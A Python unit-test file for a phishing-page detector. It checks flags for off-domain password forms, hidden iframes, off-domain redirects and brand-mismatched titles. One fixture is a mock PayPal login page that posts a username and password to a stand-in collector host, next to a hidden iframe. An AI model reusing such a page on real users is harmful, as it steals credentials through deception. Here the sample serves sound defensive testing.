import unittest

from src.signals.content import analyze_page

PHISHY = b"""<html><head><title>PayPal - Log in to your account</title>
<meta http-equiv="refresh" content="30; url=https://elsewhere.example/next"></head>
<body><form action="https://collector.evil-host.example/post.php" method="post">
<input name="u"><input type="password" name="p"></form>
<iframe src="https://tracker.example/x" width="0" height="0"></iframe></body></html>"""

BENIGN = b"""<html><head><title>Acme intranet</title></head><body>
<form action="/session" method="post"><input type="password" name="p"></form>
<form action=""><input name="q"></form><iframe src="/embed"></iframe></body></html>"""


def run(body, ctype="text/html; charset=utf-8", final="https://login-secure.example.net/", orig="login-secure.example.net",
        redirects=0, status=200):
    return analyze_page(body, ctype, final, orig, redirects, status, False)


class ContentTests(unittest.TestCase):
    def test_phishing_like_page(self):
        details, flags = run(PHISHY)
        got = {f["code"] for f in flags}
        self.assertTrue({"password_field", "password_form_posts_off_domain", "hidden_iframe",
                         "meta_refresh_off_domain", "title_brand_mismatch"} <= got, got)
        self.assertEqual(details["password_field_count"], 1)
        self.assertEqual(details["hidden_iframe_count"], 1)
        self.assertEqual(details["title"], "PayPal - Log in to your account")

    def test_benign_login_page_only_gets_info(self):
        details, flags = run(BENIGN)
        self.assertEqual({f["code"] for f in flags}, {"password_field"})
        self.assertEqual(details["forms_posting_off_domain"], 0)
        self.assertEqual(details["offsite_iframe_count"], 0)

    def test_non_password_form_off_domain_is_a_warning(self):
        _, flags = run(b'<form action="https://other.example/s"><input name="q"></form>')
        self.assertEqual([(f["code"], f["severity"]) for f in flags], [("form_posts_off_domain", "warning")])

    def test_javascript_action_counts_as_off_domain(self):
        _, flags = run(b'<form action="javascript:void(0)"><input type="password"></form>')
        self.assertIn("password_form_posts_off_domain", {f["code"] for f in flags})

    def test_password_over_http(self):
        _, flags = run(BENIGN, final="http://login-secure.example.net/")
        self.assertIn("password_over_http", {f["code"] for f in flags})

    def test_redirect_to_other_domain(self):
        details, flags = run(BENIGN, final="https://landing.other-site.example/", redirects=1)
        self.assertTrue(details["redirected_off_domain"])
        self.assertIn("redirects_to_other_domain", {f["code"] for f in flags})

    def test_same_registered_domain_redirect_is_quiet(self):
        _, flags = run(b"<html></html>", final="https://www.example.com/", orig="example.com", redirects=1)
        self.assertEqual(flags, [])

    def test_non_html_is_not_parsed(self):
        details, flags = run(b"%PDF-1.7", ctype="application/pdf")
        self.assertIn("not an HTML page", details["note"])
        self.assertEqual(flags, [])

    def test_garbage_html_does_not_raise(self):
        details, _ = run(b"<<<form <input type=password <iframe " + bytes(range(256)))
        self.assertEqual(details["status"], "ok")

    def test_declared_charset_is_used(self):
        details, _ = run("<title>Caf\u00e9 login</title>".encode("latin-1"), ctype="text/html; charset=latin-1")
        self.assertEqual(details["title"], "Caf\u00e9 login")

    def test_unknown_charset_falls_back(self):
        details, _ = run(b"<title>ok</title>", ctype="text/html; charset=not-a-charset")
        self.assertEqual(details["title"], "ok")


if __name__ == "__main__":
    unittest.main()
